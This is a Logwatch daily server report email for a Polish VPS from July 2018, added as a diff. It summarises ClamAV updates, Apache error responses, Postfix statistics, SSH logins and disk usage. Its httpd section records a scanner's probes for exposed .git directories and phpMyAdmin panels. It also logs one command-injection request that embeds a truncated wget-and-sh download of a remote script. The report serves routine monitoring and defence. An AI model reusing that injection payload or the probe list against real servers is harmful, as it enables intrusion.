@@ -1,0 +1,229 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id 5B13A9F200E8; Thu,  5 Jul 2018 03:29:10 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20180705012910.5B13A9F200E8@hrankiety.pl>
+Date: Thu,  5 Jul 2018 03:29:08 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Thu Jul  5 03:29:07 2018
+        Date Range Processed: yesterday
+                              ( 2018-Jul-04 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Wed Jul  4 03:47:15 2018
+ 
+ Last Status:
+    WARNING: Your ClamAV installation is OUTDATED!
+    WARNING: Local version: 0.99.4 Recommended version: 0.100.0
+    DON'T PANIC! Read http://www.clamav.net/documents/upgrading-clamav
+    main.cvd is up to date (version: 58, sigs: 4566249, f-level: 60, builder: sigmgr)
+    Downloading daily-24718.cdiff [100%]
+    Downloading daily-24719.cdiff [100%]
+    Downloading daily-24720.cdiff [100%]
+    daily.cld updated (version: 24720, sigs: 2002774, f-level: 63, builder: neo)
+    bytecode.cld is up to date (version: 322, sigs: 90, f-level: 63, builder: neo)
+    [LibClamAV] Detected duplicate databases /var/lib/clamav/main.cvd and /var/lib/clamav/main.cld, please manually remove one of them
+    Database updated (6569113 signatures) from db.local.clamav.net (IP: 104.16.187.138)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ A total of 1 sites probed the server 
+    76.187.56.60
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 7 Time(s)
+       //./.././..: 1 Time(s)
+    404 Not Found
+       /.git/HEAD: 1 Time(s)
+       /PMA/index.php: 3 Time(s)
+       /PMA2/index.php: 2 Time(s)
+       /admin/.git/HEAD: 1 Time(s)
+       /admin/PMA/index.php: 3 Time(s)
+       /admin/index.php: 3 Time(s)
+       /admin/mysql/index.php: 3 Time(s)
+       /admin/mysql2/index.php: 1 Time(s)
+       /admin/phpMyAdmin/index.php: 3 Time(s)
+       /admin/phpmyadmin/index.php: 3 Time(s)
+       /admin/phpmyadmin2/index.php: 3 Time(s)
+       /admin/pma/index.php: 3 Time(s)
+       /alpha/.git/HEAD: 1 Time(s)
+       /analytics/.git/HEAD: 1 Time(s)
+       /android/.git/HEAD: 1 Time(s)
+       /api/.git/HEAD: 1 Time(s)
+       /apk/.git/HEAD: 1 Time(s)
+       /app/.git/HEAD: 1 Time(s)
+       /apple/.git/HEAD: 1 Time(s)
+       /archive/.git/HEAD: 1 Time(s)
+       /assets/.git/HEAD: 1 Time(s)
+       /backend/.git/HEAD: 1 Time(s)
+       /backup/.git/HEAD: 1 Time(s)
+       /beta/.git/HEAD: 1 Time(s)
+       /bitbucket/.git/HEAD: 1 Time(s)
+       /bucket/.git/HEAD: 1 Time(s)
+       /cdn/.git/HEAD: 1 Time(s)
+       /claroline/phpMyAdmin/index.php: 3 Time(s)
+       /cloud/.git/HEAD: 1 Time(s)
+       /content/.git/HEAD: 1 Time(s)
+       /controller/.git/HEAD: 1 Time(s)
+       /data/.git/HEAD: 1 Time(s)
+       /db.init.php: 3 Time(s)
+       /db/index.php: 2 Time(s)
+       /db_session.init.php: 3 Time(s)
+       /dbadmin/index.php: 2 Time(s)
+       /demo/.git/HEAD: 1 Time(s)
+       /dev/.git/HEAD: 1 Time(s)
+       /developer/.git/HEAD: 1 Time(s)
+       /development/.git/HEAD: 1 Time(s)
+       /downloads/.git/HEAD: 1 Time(s)
+       /files/.git/HEAD: 1 Time(s)
+       /git/.git/HEAD: 1 Time(s)
+       /gitlab/.git/HEAD: 1 Time(s)
+       /img/.git/HEAD: 1 Time(s)
+       /index.php: 2 Time(s)
+       /ipa/.git/HEAD: 1 Time(s)
+       /js/.git/HEAD: 1 Time(s)
+       /live/.git/HEAD: 1 Time(s)
+       /login.cgi?cli=aa%20aa%27;wget%20http://18 ... sh%20/tmp/r%27$: 1 Time(s)
+       /m/.git/HEAD: 1 Time(s)
+       /media-upload/.git/HEAD: 1 Time(s)
+       /media/.git/HEAD: 1 Time(s)
+       /mobile/.git/HEAD: 1 Time(s)
+       /my/.git/HEAD: 1 Time(s)
+       /myadmin/index.php: 3 Time(s)
+       /myadmin2/index.php: 2 Time(s)
+       /mysql-admin/index.php: 2 Time(s)
+       /mysql/index.php: 2 Time(s)
+       /mysqladmin/index.php: 3 Time(s)
+       /php/.git/HEAD: 1 Time(s)
+       /phpMyAdmin.old/index.php: 2 Time(s)
+       /phpMyAdmin/index.php: 3 Time(s)
+       /phpMyAdmin/phpMyAdmin/index.php: 3 Time(s)
+       /phpMyAdminold/index.php: 3 Time(s)
+       /phpMyadmin_bak/index.php: 2 Time(s)
+       /phpadmin/index.php: 3 Time(s)
+       /phpma/index.php: 3 Time(s)
+       /phpmyadmin-old/index.php: 3 Time(s)
+       /phpmyadmin/index.php: 2 Time(s)
+       /phpmyadmin/phpmyadmin/index.php: 3 Time(s)
+       /phpmyadmin0/index.php: 3 Time(s)
+       /phpmyadmin1/index.php: 2 Time(s)
+       /phpmyadmin2/index.php: 2 Time(s)
+       /pma-old/index.php: 2 Time(s)
+       /pma/index.php: 2 Time(s)
+       /pmamy/index.php: 3 Time(s)
+       /pmamy2/index.php: 3 Time(s)
+       /pmd/index.php: 3 Time(s)
+       /prd/.git/HEAD: 1 Time(s)
+       /prod/.git/HEAD: 1 Time(s)
+       /production/.git/HEAD: 1 Time(s)
+       /public/.git/HEAD: 1 Time(s)
+       /qa/.git/HEAD: 1 Time(s)
+       /repo/.git/HEAD: 1 Time(s)
+       /s.php: 3 Time(s)
+       /s3/.git/HEAD: 1 Time(s)
+       /sheep.php: 3 Time(s)
+       /stage/.git/HEAD: 1 Time(s)
+       /staging/.git/HEAD: 1 Time(s)
+       /stanislas/.git/HEAD: 1 Time(s)
+       /static/.git/HEAD: 1 Time(s)
+       /stuff.php: 2 Time(s)
+       /test/.git/HEAD: 1 Time(s)
+       /testflight/.git/HEAD: 1 Time(s)
+       /tools/phpMyAdmin/index.php: 3 Time(s)
+       /typo3/phpmyadmin/index.php: 3 Time(s)
+       /uploads/.git/HEAD: 1 Time(s)
+       /video/.git/HEAD: 1 Time(s)
+       /w.php: 2 Time(s)
+       /wc.php: 1 Time(s)
+       /web/.git/HEAD: 1 Time(s)
+       /web/phpMyAdmin/index.php: 3 Time(s)
+       /webdav/: 3 Time(s)
+       /widgets/.git/HEAD: 1 Time(s)
+       /wp-login.php: 1 Time(s)
+       /wuwu11.php: 3 Time(s)
+       /www/.git/HEAD: 1 Time(s)
+       /www/phpMyAdmin/index.php: 2 Time(s)
+       /xampp/phpmyadmin/index.php: 3 Time(s)
+       /xw.php: 3 Time(s)
+       /xx.php: 3 Time(s)
+    405 Method Not Allowed
+       /: 3 Time(s)
+    408 Request Timeout
+       null: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+      487   *Warning: Pre-queue content-filter connection overload 
+     2912   SASL authentication failed 
+       36   Miscellaneous warnings 
+ 
+    1.135M  Bytes accepted                         1,190,417
+    1.129M  Bytes delivered                        1,184,211
+ ========   ================================================
+ 
+       22   Accepted                                 100.00%
+ --------   ------------------------------------------------
+       22   Total                                    100.00%
+ ========   ================================================
+ 
+     2933   Connections made      
+     2932   Disconnections        
+       22   Removed from queue    
+       20   Delivered             
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 2 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   22G   29G  44% /
+ none            512M  4.0K  512M   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
